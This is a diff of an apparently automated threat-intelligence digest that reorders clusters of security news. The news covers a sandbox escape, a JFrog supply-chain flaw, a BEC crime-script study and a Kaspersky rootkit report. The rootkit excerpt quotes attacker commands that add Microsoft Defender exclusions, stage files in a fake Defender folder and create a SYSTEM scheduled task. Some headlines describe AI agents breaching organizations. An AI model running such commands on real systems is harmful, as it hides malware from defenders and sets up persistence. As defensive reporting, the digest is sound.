   - Link: https://thehackernews.com/2026/08/clop-linked-windchill-web-shell.html
   - Summary: A JavaServer Pages (JSP) web shell deployed following the exploitation of a critical security flaw in PTC Windchill and FlexPLM servers is specifically designed for the enterprise Product Lifecycle Management (PLM) software, according to new findings from ReliaQuest. The cybersecurity company characterized the web shell as a fully equipped extortion platform capable of mapping sensitive vault
 
+### Cluster 9f44f5f9a4 — score 12
+
+- Title: Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-08-20T13:48:24+00:00
+- Link: https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
+- Fetch status: ok
+- Member count: 4
+- Corroborating source count: 3
+- Strong signals: GitHub
+
+#### Cluster taxonomy (union across members)
+- threat_categories: credential_theft, ddos
+- affected_industries: telecommunications
+- affected_products: Anthropic/Claude, Atlassian Jira, Azure, GitHub, Snowflake
+- content_type: news_report, vulnerability_disclosure
+- confidence_tier: tier_2_operator, tier_4_news, tier_5_chatter
+
+#### Primary article taxonomy
+- threat_categories: credential_theft, ddos
+- affected_industries: telecommunications
+- affected_products: GitHub, Azure, Anthropic/Claude
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability ("GHSA-864f-rcv7-6rh4"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.
+```
+
+#### Full body
+
+```
+Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE  Ravie Lakshmanan  Aug 20, 2026 Vulnerability / Application Security Cybersecurity researchers have disclosed a critical security flaw in isolated-vm , a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability (" GHSA-864f-rcv7-6rh4 "), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0. It has been patched in versions 6.2.0 and 7.0.1 released earlier this month. Isolated-vm is a Node.js library for running untrusted JavaScript inside a V8 Isolate , an independent instance of the Google V8 JavaScript engine, allowing multiple sandboxed JavaScript environments to run concurrently without sharing data or interfering with each other. The npm package has witnessed nearly 1 million downloads over the past week. Because each V8 Isolate has a separate state and maintains its own heap, it is not possible to directly pass JavaScript objects from the main Node.js thread into a worker isolate. Isolated-vm exposes a class called ExternalCopy to securely serialize JavaScript objects out of the host isolate and deserialize them into the guest isolate. The vulnerability identified by Endor Labs resides in this component, allowing code running inside the sandbox to break out and corrupt memory in the host application. "A type confusion in ExternalCopy's handling of the transferList option lets code running inside the sandbox corrupt memory in the host process," Endor Labs researcher Cristian-Alexandru Staicu, who is credited with discovering and reporting the flaw, said in a technical write-up shared with The Hacker News. "Starting from nothing but a single ivm.Reference, the standard way hosts hand a sandbox any capability at all, we escalated the bug from a controlled-address crash all the way to hijacking the host's control flow, demonstrating a full guest-to-host sandbox escape." Successful exploitation of the flaw allows memory corruption in the host process, causing the host process to crash with a segmentation fault ( SIGSEGV ). It can also lead to a guest-to-host sandbox escape and an erosion of the trust boundary that undermines the very purpose of isolated-vm. "Minimum demonstrated impact is a reliable, controlled-address crash (denial-of-service) triggerable by any guest that has been given an ivm.Reference (the standard way to grant a sandbox any capability)," project maintainer Marcel Laverdet said in an advisory. "Maximum demonstrated impact is control-flow hijack of the host process, i.e., potential remote code execution in the host." Users who have isolated-vm installed in their developer environments are advised to update to the latest version for optimal protection. Additional details of the full exploit have been withheld so as to prevent bad actors from launching their own attacks. "The most important takeaway is that what was not broken was the isolation primitive itself," Staicu said. "V8's Isolate boundary held. What failed was the C++ glue code that marshals values across that boundary. A perfectly sound building block was undermined by the binding layer wrapped around it." Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Developer Security , JavaScript , Open Source , remote code execution , Sandbox Security , Vulnerability ⚡ Top Stories This Week Azure Cosmos DB Flaw Exposed Platform-Wide Key That Could Access Any Database Anthropic Says Claude Mistook the Open Internet for a CTF and Breached Three Organizations Researchers Report 84 Flaws in 4G and 5G Cores, Including a Session Hijacking Flaw Cheap Android TV Boxes Pose as Phones and Turn Owners’ Broadband Into Proxies N-able Says Attackers Take Over N-central Servers
+```
+
+#### Corroborating sources (3)
+
+- **The Hacker News** (cyber_news_breach_reporting)
+  - Title: Isolated-vm Flaw Lets Sandboxed JavaScript Escape to Host for Potential RCE
+  - Published: 2026-08-20T13:48:24+00:00
+  - Link: https://thehackernews.com/2026/08/isolated-vm-flaw-lets-sandboxed.html
+  - Summary: Cybersecurity researchers have disclosed a critical security flaw in isolated-vm, a popular open-source sandbox with more than 2,900 stars and 190 forks on GitHub, that could allow attackers to escape the confines of the isolated environment. The vulnerability ("GHSA-864f-rcv7-6rh4"), which has yet to be assigned a CVE identifier, impacts all versions of the library before and including 7.0.0.
+- **Wiz Research** (cloud_identity_infrastructure)
+  - Title: Wiz Red Agent Finds Its Way Into Snowflake’s Internal Jira Through a Flaw in a GitHub Copilot–Assisted PR
+  - Published: 2026-08-17T14:00:00+00:00
+  - Link: https://www.wiz.io/blog/red-agent-snowflake-copilot-cicd-bug
+  - Summary: Wiz Red Agent independently discovered and exploited a GitHub Actions injection missed by GitHub’s Advanced Security, validated access to sensitive data in Snowflake’s internal Jira, and assessed the blast radius—all without human intervention, five days after the flaw became live.
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - Title: How a popular Android library silently exposed thousands of apps to Arbitrary File Overwrite (AFO). https://itis911.github.io/writeups/cropper-vulnerability.html
+  - Published: 2026-08-18T16:24:33+00:00
+  - Link: https://www.reddit.com/r/netsec/comments/1vru26k/how_a_popular_android_library_silently_exposed/
+  - Summary: submitted by /u/Fit_Veterinarian4403 [link] [comments]
+
 ### Cluster 213e3c4494 — score 11
 
 - Title: Identity Abuse Through Trusted Communication Channels
@@ -1971,51 +1959,6 @@ UAT-10147: Chinese-speaking adversary integrates agentic AI into post-compromise
   - Link: https://blog.talosintelligence.com/uat-10147-chinese-speaking-adversary-integrates-agentic-ai-into-post-compromise-operations/
   - Summary: Cisco Talos discovered a Chinese-speaking cybercrime group, tracked as UAT-10147, that targets a wide range of vulnerable web servers. This is an overview of the campaign, examining the countries affected, potential impact of BadIIS infections, the attack chain, and post-compromise tactics.
 
-### Cluster 21cbe0b5fa — score 10
-
-- Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
-- Source: Kaspersky Securelist (threat_research_primary)
-- Published: 2026-08-14T09:00:14+00:00
-- Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: apt_espionage, web_shell_backdoor
-- actor_attribution: Mustang Panda
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: apt_espionage, web_shell_backdoor
-- actor_attribution: Mustang Panda
-- affected_products: Microsoft Defender
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
-```
-
-#### Full body
-
-```
-Table of Contents Introduction Technical analysis CoolClient components First stage: libngs.dll Second stage: loadcert.ini (before synchost.exe injection) Command handler Establishing AutoRun persistence Process injection into synchost.exe Service installation Administrator privilege check Elevated relaunch and UAC bypass Second stage: loadcert.ini (Injected Execution) Kernel-Mode driver deployment Driver initialization Cert.ini process injection Msagent.sys driver Driver configuration Preparation for process hiding Process, object, and image load callbacks Object callbacks Process and image load callbacks MiniFilter registration Registry callback registration IOCTL command dispatcher Kernel module enumeration and hiding Nsiproxy hooking and data filtering Victimology Attribution Conclusion IOCs Authors Fareed Radzi Introduction CoolClient is a backdoor family attributed to the HoneyMyte APT group (also known as Mustang Panda) that has been used in their cyber-espionage campaigns targeting organizations across Asia and Russia. It supports such capabilities as keylogging, clipboard theft, credential harvesting, file management, system reconnaissance, and plugin-based extensions. Since its first public disclosure by Sophos in 2022 and subsequent analysis by Trend Micro in 2023 , CoolClient has continued to evolve. In 2025 , we analyzed a newer variant that introduced clipboard theft and HTTP traffic interception for credential harvesting. In late 2025 and 2026, our latest investigation reveal another major evolution. The newest CoolClient variant can deploy a signed kernel-mode driver as a Windows service and communicate with it through IOCTL requests. The driver enhances the malware’s stealth by hiding the CoolClient process, protecting related files and registry entries, and preventing them from being inspected or modified. The overall design is comparable to the kernel-mode enhancements previously observed in ToneShell , but the CoolClient driver exposes dedicated IOCTL handlers that allow the user-mode backdoor to communicate directly with the driver. We have observed this updated CoolClient variant and its accompanying driver in intrusions across multiple countries in Asia, including Pakistan, Mongolia, and Myanmar. Technical analysis In the observed campaign targeting Myanmar, HoneyMyte used PlugX as the initial post-compromise implant to deploy the CoolClient components. Before deploying the malware, the actor added both a folder exclusion and a file exclusion to Microsoft Defender for the fake Windows Defender installation directory and the renamed sideloader executable ( defender.exe ). wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender" wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender\defender.exe" 1 2 wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender" wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender\defender.exe" The actor then created a fake Windows Defender installation directory, copied the CoolClient components into it, and renamed a legitimate Sangfor executable, usually named Sang.exe , to defender.exe to serve as the DLL sideloader. xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" /a /s /v /e /f 1 xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" / a / s / v / e / f Persistence was established through a scheduled task that launched defender.exe with SYSTEM privileges during system startup. schtasks /create /sc onstart /tn "\Microsoft\Windows\Windows Defender Advanced Threat Protection Service" /tr "\"$p
-```
-
-#### Corroborating sources (1)
-
-- **Kaspersky Securelist** (threat_research_primary)
-  - Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
-  - Published: 2026-08-14T09:00:14+00:00
-  - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
-  - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
-
 ### Cluster 8a66834bf6 — score 10
 
 - Title: Thousands of Hacked WordPress Sites, One Operation: Unmasking StopAndProtect
@@ -2112,6 +2055,51 @@ FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 17th Augus
   - Link: https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
   - Summary: For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were […] The post 17th August – Threat Intelligence Report appeared first on Check Point Research .
 
+### Cluster 21cbe0b5fa — score 10
+
+- Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
+- Source: Kaspersky Securelist (threat_research_primary)
+- Published: 2026-08-14T09:00:14+00:00
+- Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: apt_espionage, web_shell_backdoor
+- actor_attribution: Mustang Panda
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: apt_espionage, web_shell_backdoor
+- actor_attribution: Mustang Panda
+- affected_products: Microsoft Defender
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
+```
+
+#### Full body
+
+```
+Table of Contents Introduction Technical analysis CoolClient components First stage: libngs.dll Second stage: loadcert.ini (before synchost.exe injection) Command handler Establishing AutoRun persistence Process injection into synchost.exe Service installation Administrator privilege check Elevated relaunch and UAC bypass Second stage: loadcert.ini (Injected Execution) Kernel-Mode driver deployment Driver initialization Cert.ini process injection Msagent.sys driver Driver configuration Preparation for process hiding Process, object, and image load callbacks Object callbacks Process and image load callbacks MiniFilter registration Registry callback registration IOCTL command dispatcher Kernel module enumeration and hiding Nsiproxy hooking and data filtering Victimology Attribution Conclusion IOCs Authors Fareed Radzi Introduction CoolClient is a backdoor family attributed to the HoneyMyte APT group (also known as Mustang Panda) that has been used in their cyber-espionage campaigns targeting organizations across Asia and Russia. It supports such capabilities as keylogging, clipboard theft, credential harvesting, file management, system reconnaissance, and plugin-based extensions. Since its first public disclosure by Sophos in 2022 and subsequent analysis by Trend Micro in 2023 , CoolClient has continued to evolve. In 2025 , we analyzed a newer variant that introduced clipboard theft and HTTP traffic interception for credential harvesting. In late 2025 and 2026, our latest investigation reveal another major evolution. The newest CoolClient variant can deploy a signed kernel-mode driver as a Windows service and communicate with it through IOCTL requests. The driver enhances the malware’s stealth by hiding the CoolClient process, protecting related files and registry entries, and preventing them from being inspected or modified. The overall design is comparable to the kernel-mode enhancements previously observed in ToneShell , but the CoolClient driver exposes dedicated IOCTL handlers that allow the user-mode backdoor to communicate directly with the driver. We have observed this updated CoolClient variant and its accompanying driver in intrusions across multiple countries in Asia, including Pakistan, Mongolia, and Myanmar. Technical analysis In the observed campaign targeting Myanmar, HoneyMyte used PlugX as the initial post-compromise implant to deploy the CoolClient components. Before deploying the malware, the actor added both a folder exclusion and a file exclusion to Microsoft Defender for the fake Windows Defender installation directory and the renamed sideloader executable ( defender.exe ). wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender" wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender\defender.exe" 1 2 wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender" wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender\defender.exe" The actor then created a fake Windows Defender installation directory, copied the CoolClient components into it, and renamed a legitimate Sangfor executable, usually named Sang.exe , to defender.exe to serve as the DLL sideloader. xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" /a /s /v /e /f 1 xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" / a / s / v / e / f Persistence was established through a scheduled task that launched defender.exe with SYSTEM privileges during system startup. schtasks /create /sc onstart /tn "\Microsoft\Windows\Windows Defender Advanced Threat Protection Service" /tr "\"$p
+```
+
+#### Corroborating sources (1)
+
+- **Kaspersky Securelist** (threat_research_primary)
+  - Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
+  - Published: 2026-08-14T09:00:14+00:00
+  - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
+  - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
+
 ### Cluster 8883aedcfe — score 10
 
 - Title: How QR-code phishing can slip past corporate security measures
@@ -2152,6 +2140,49 @@ Business Security How QR-code phishing can slip past corporate security measures
   - Published: 2026-08-17T09:00:00+00:00
   - Link: https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/
   - Summary: Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.
+
+### Cluster 73a67d61f6 — score 10
+
+- Title: Describing attacks with crime script analysis
+- Source: Cisco Talos (threat_research_primary)
+- Published: 2026-08-19T10:00:52+00:00
+- Link: https://blog.talosintelligence.com/describing-attacks-with-crime-script-analysis/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
+- affected_industries: financial_services
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: phishing_social_eng
+- affected_industries: financial_services
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Martin explores how using crime script analysis to describe an attack with everyday language makes the situation accessible to non-technical audiences and identify points where the crime can be disrupted.
+```
+
+#### Full body
+
+```
+Describing attacks with crime script analysis By Martin Lee Wednesday, August 19, 2026 06:00 On The Radar Crime script analysis is a narrative-driven technique that can be used alongside, or as an alternative to, tactics, techniques, and procedures (TTPs) — creating human-readable stories that describe attacks in a way non-technical audiences can understand. By analyzing the attacker’s workflow, we can identify how AI can be used to industrialize attacks. Through considering a business email compromise (BEC) example, we demonstrate how attackers may scale the attack to target previously unprofitable victims. Deconstructing an attack into discrete steps allows defenders to pinpoint intervention points where defenses can be effectively deployed, or where strategic disruption can break the script and thwart the threat actor's operation. Effective defense against cyber attacks requires understanding how attacks are carried out and identifying where the attack can be disrupted or detected. Lockheed Martin’s Cyber Kill Chain was one of the earliest models to describe the steps required to conduct a cyber attack. However, its seven-step linear sequence is too rigid to apply to many attacks. The Attack Flow model of the MITRE ATT&CK framework allows various tactics, techniques, and procedures (TTPs) to be chained together to describe exactly how attacks are conducted, including branches and loops if necessary. The resulting graphs are comprehensive, but can be daunting to a non-technical audience. In a world of evolving threats and shrinking budgets, defenders need techniques to communicate threats to a wider audience. Crime script analysis (CSA) is a technique originally developed in the mid-1990s as a criminology tool to understand how crimes are committed. CSA allows us to decompose an attack into a sequence of actions, decisions, and situational requirements. Describing an attack as a narrative using everyday language not only makes the description accessible to non-technical audiences, but also to identify "choke points" where the crime can be disrupted. If MITRE ATT&CK TTPs describe the building blocks that comprise an attack, Attack Flow diagrams are the structural engineering blueprints showing how the blocks fit together, and CSA is the architect’s artistic impression of the finished building. Each component has their place in providing a picture of what is happening at different levels of abstraction for different audiences. Business email compromise as a case study The business email compromise (BEC) is a common scam. Someone with financial authority receives a message purporting to be from a superior in the same organization requesting an urgent payment. If the victim is fooled, payment is released to the scammer, who acts quickly to launder the money to disguise its origin before the scam is uncovered. In April I wrote about such an attack against a small, community sports club of which I am a member. The sum requested in the attack wasn’t large, so the reason was plausible. However, the tone of the email wasn’t quite correct. The treasurer’s suspicions were raised and the attempted fraud uncovered. This incident was particularly interesting because of the small scale of the attack. Historically, the research necessary to conduct the attack — the identification of the target victim, the person spoofed, the nature of the social engineering lure — has limited its scalability. Carrying out these tasks manually takes time and has meant that it has typically been conducted against larger businesses. The advent of AI means that the previously time-consuming preparative work can be automated. Expressing the attack as a crime script helps us understand where AI may assist the attacker and how the attack could be disrupted. Putting BEC in the crime script narrative We can imagine the crime script for the attack as follows: Figure 1. A general BEC crime script. Steps 1 – 4 are time consuming to perform manually, but can be automate
+```
+
+#### Corroborating sources (1)
+
+- **Cisco Talos** (threat_research_primary)
+  - Title: Describing attacks with crime script analysis
+  - Published: 2026-08-19T10:00:52+00:00
+  - Link: https://blog.talosintelligence.com/describing-attacks-with-crime-script-analysis/
+  - Summary: Martin explores how using crime script analysis to describe an attack with everyday language makes the situation accessible to non-technical audiences and identify points where the crime can be disrupted.
 
 ### Cluster a40b955a81 — score 10
 
@@ -2234,49 +2265,6 @@ CTEM: From Visibility to Measurable Risk Reduction Horizon3 August 19, 2026 Info
   - Published: 2026-08-19T16:10:35+00:00
   - Link: https://horizon3.ai/intelligence/infographics/ctem-from-visibility-to-measurable-risk-reduction/
   - Summary: Learn how to operationalize CTEM as a continuous cycle that validates exploitable risk, prioritizes what matters, verifies remediation, and drives measurable risk reduction.
-
-### Cluster 73a67d61f6 — score 10
-
-- Title: Describing attacks with crime script analysis
-- Source: Cisco Talos (threat_research_primary)
-- Published: 2026-08-19T10:00:52+00:00
-- Link: https://blog.talosintelligence.com/describing-attacks-with-crime-script-analysis/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: phishing_social_eng
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: phishing_social_eng
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Martin explores how using crime script analysis to describe an attack with everyday language makes the situation accessible to non-technical audiences and identify points where the crime can be disrupted.
-```
-
-#### Full body
-
-```
-Describing attacks with crime script analysis By Martin Lee Wednesday, August 19, 2026 06:00 On The Radar Crime script analysis is a narrative-driven technique that can be used alongside, or as an alternative to, tactics, techniques, and procedures (TTPs) — creating human-readable stories that describe attacks in a way non-technical audiences can understand. By analyzing the attacker’s workflow, we can identify how AI can be used to industrialize attacks. Through considering a business email compromise (BEC) example, we demonstrate how attackers may scale the attack to target previously unprofitable victims. Deconstructing an attack into discrete steps allows defenders to pinpoint intervention points where defenses can be effectively deployed, or where strategic disruption can break the script and thwart the threat actor's operation. Effective defense against cyber attacks requires understanding how attacks are carried out and identifying where the attack can be disrupted or detected. Lockheed Martin’s Cyber Kill Chain was one of the earliest models to describe the steps required to conduct a cyber attack. However, its seven-step linear sequence is too rigid to apply to many attacks. The Attack Flow model of the MITRE ATT&CK framework allows various tactics, techniques, and procedures (TTPs) to be chained together to describe exactly how attacks are conducted, including branches and loops if necessary. The resulting graphs are comprehensive, but can be daunting to a non-technical audience. In a world of evolving threats and shrinking budgets, defenders need techniques to communicate threats to a wider audience. Crime script analysis (CSA) is a technique originally developed in the mid-1990s as a criminology tool to understand how crimes are committed. CSA allows us to decompose an attack into a sequence of actions, decisions, and situational requirements. Describing an attack as a narrative using everyday language not only makes the description accessible to non-technical audiences, but also to identify "choke points" where the crime can be disrupted. If MITRE ATT&CK TTPs describe the building blocks that comprise an attack, Attack Flow diagrams are the structural engineering blueprints showing how the blocks fit together, and CSA is the architect’s artistic impression of the finished building. Each component has their place in providing a picture of what is happening at different levels of abstraction for different audiences. Business email compromise as a case study The business email compromise (BEC) is a common scam. Someone with financial authority receives a message purporting to be from a superior in the same organization requesting an urgent payment. If the victim is fooled, payment is released to the scammer, who acts quickly to launder the money to disguise its origin before the scam is uncovered. In April I wrote about such an attack against a small, community sports club of which I am a member. The sum requested in the attack wasn’t large, so the reason was plausible. However, the tone of the email wasn’t quite correct. The treasurer’s suspicions were raised and the attempted fraud uncovered. This incident was particularly interesting because of the small scale of the attack. Historically, the research necessary to conduct the attack — the identification of the target victim, the person spoofed, the nature of the social engineering lure — has limited its scalability. Carrying out these tasks manually takes time and has meant that it has typically been conducted against larger businesses. The advent of AI means that the previously time-consuming preparative work can be automated. Expressing the attack as a crime script helps us understand where AI may assist the attacker and how the attack could be disrupted. Putting BEC in the crime script narrative We can imagine the crime script for the attack as follows: Figure 1. A general BEC crime script. Steps 1 – 4 are time consuming to perform manually, but can be automate
-```
-
-#### Corroborating sources (1)
-
-- **Cisco Talos** (threat_research_primary)
-  - Title: Describing attacks with crime script analysis
-  - Published: 2026-08-19T10:00:52+00:00
-  - Link: https://blog.talosintelligence.com/describing-attacks-with-crime-script-analysis/
-  - Summary: Martin explores how using crime script analysis to describe an attack with everyday language makes the situation accessible to non-technical audiences and identify points where the crime can be disrupted.
 
 ### Cluster 82fb30db67 — score 10
 
@@ -2499,39 +2487,6 @@ Risky Bulletin Podcast August 17, 2026 Risky Bulletin: The EU publishes its upco
   - Published: 2026-08-17T04:52:58+00:00
   - Link: https://risky.biz/RBNEWS601/
   - Summary: The EU publishes its upcoming cybersecurity standards, hackers breach France’s tax agency, threat actors exploit a GeoServer zero-day hours after disclosure, and an exploit unlocks old AMD CPUs with one instruction.
-
-### Cluster afcea3ecd9 — score 9
-
-- Title: Wireshark 4.6.8 Released, (Sun, Aug 16th)
-- Source: SANS Internet Storm Center (government_authoritative)
-- Published: 2026-08-16T21:31:48+00:00
-- Link: https://isc.sans.edu/diary/rss/33248
-- Fetch status: fetch_failed:HTTPError
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Primary article taxonomy
-- content_type: news_report
-- confidence_tier: tier_1_government
-
-#### Summary
-
-```
-Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.
-```
-
-#### Corroborating sources (1)
-
-- **SANS Internet Storm Center** (government_authoritative)
-  - Title: Wireshark 4.6.8 Released, (Sun, Aug 16th)
-  - Published: 2026-08-16T21:31:48+00:00
-  - Link: https://isc.sans.edu/diary/rss/33248
-  - Summary: Wireshark release 4.6.8 fixes 28 vulnerabilities and 25 bugs.
 
 ### Cluster 8fa395ab79 — score 9
 
@@ -2810,57 +2765,6 @@ Critical NetScaler Flaw Can Bypass Authentication on Certain Gateway and AAA Ser
   - Published: 2026-08-20T13:35:13+00:00
   - Link: https://thehackernews.com/2026/08/critical-netscaler-flaw-can-bypass.html
   - Summary: Citrix has released updates to address two security flaws impacting NetScaler ADC and NetScaler Gateway deployments, including a critical-severity authentication bypass vulnerability. According to the cloud computing and virtualization technology company, the issues affect customer-managed NetScaler ADC and NetScaler Gateway, including certain FIPS and NDcPP builds, as well as SecurAccess
-
-### Cluster 2d052ce523 — score 9
-
-- Title: JFrog Artifactory Flaws Enable Software Supply Chain Attacks
-- Source: Infosecurity Magazine (cyber_news_breach_reporting)
-- Published: 2026-08-20T14:30:00+00:00
-- Link: https://www.infosecurity-magazine.com/news/jfrog-flaws-software-supply-chain/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, ransomware_extortion, supply_chain
-- actor_attribution: Medusa
-- affected_industries: critical_infrastructure, government
-- affected_products: Apple iOS/macOS, GitHub, npm
-- cve_ids: CVE-2026-65922, CVE-2026-69106
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, supply_chain, credential_theft
-- actor_attribution: Medusa
-- affected_industries: government, critical_infrastructure
-- affected_products: Apple iOS/macOS, GitHub, npm
-- cve_ids: CVE-2026-69106, CVE-2026-65922
-- urgency_signals: preauth_unauth
-- content_type: news_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-Two Artifactory flaws allowed attackers to poison package metadata across software repositories
-```
-
-#### Full body
-
-```
-Infosecurity Magazine Home » News » JFrog Artifactory Flaws Enable Software Supply Chain Attacks JFrog Artifactory Flaws Enable Software Supply Chain Attacks News 20 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino Two vulnerabilities in JFrog Artifactory have been found which allow anonymous or low-privileged users to manipulate package metadata without modifying the underlying artifacts, creating a potential route to software supply chain compromise. Oligo Security reported the flaws to JFrog on June 25 and detailed them in research published on August 20. The findings cover CVE-2026-69106 (CVSS score 8.8), which affects the handling of the X-Orig-Client-Uri header, and CVE-2026-65922 (CVSS score 5.4), which allows writes into trusted .jfrog/ metadata paths. Both flaws are listed on the National Vulnerability Database and JFrog has issued fixes . Header Trust Enables Shared Cache Poisoning CVE-2026-69106 stemmed from Artifactory accepting X-Orig-Client-Uri from external clients without verifying that it originated from trusted routing infrastructure. Oligo found that virtual repositories could turn this into a cross-user cache poisoning issue. In Helm, the full attacker-controlled URL was written into generated metadata while only its 32-bit Java hash was used to determine the cache location. A different URL could therefore be constructed with the same hash and cause a poisoned index to be served to later users. npm had a separate cache guard, but it checked two other override headers and not X-Orig-Client-Uri. The researchers also identified a related issue in JFrog's recommended nginx configuration, where X-Forwarded-Proto could be used to influence generated absolute URLs when a caching reverse proxy was deployed. Read more on software supply chain attacks: GitHub to Update npm to Thwart Software Supply Chain Attacks Trusted Metadata Paths Bypass Normal Controls CVE-2026-65922, on the other hand, affected Artifactory's handling of internal .jfrog/ metadata. The REST COPY and MOVE APIs and WebDAV MKCOL could reach these paths without the normal protection applied to standard uploads. The resulting authorization path treated .jfrog/ as trusted, allowing an authenticated user with suitable repository access to place or create content there. Oligo said these files are consumed by package handlers for functions including npm signing keys, OCI referrers, Docker indexes and Ansible indexes. The researchers recommended upgrading Artifactory to a patched release and disabling anonymous access where it is not required, particularly in shared or internet-accessible environments. They also advised reviewing users and service accounts with repository access and stripping or overwriting client-supplied X-Orig-Client-Uri and X-Forwarded-Proto headers at the routing boundary. You may also like Critical CVEs in Chaos-Mesh Enable In-Cluster Code Execution News 17 September 2025 Hackers Use NuGet Packages to Target .NET Developers News 21 March 2023 Lookalike npm Package Hides a Multi-Stage Windows RAT News 23 June 2026 Flaws Expose Risks in Fluent Bit Logging Agent News 24 November 2025 High-Severity Access Control Vulnerability Found in Spring WebFlux News 9 August 2023 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice OpenAI Tightens AI Safeguards Following Hugging Face Incident News 19 August 2026 1 Over 500 Critical Infrastructure Organizations Hit by Medusa Ransomware News 19 August 2026 2 AI is Already 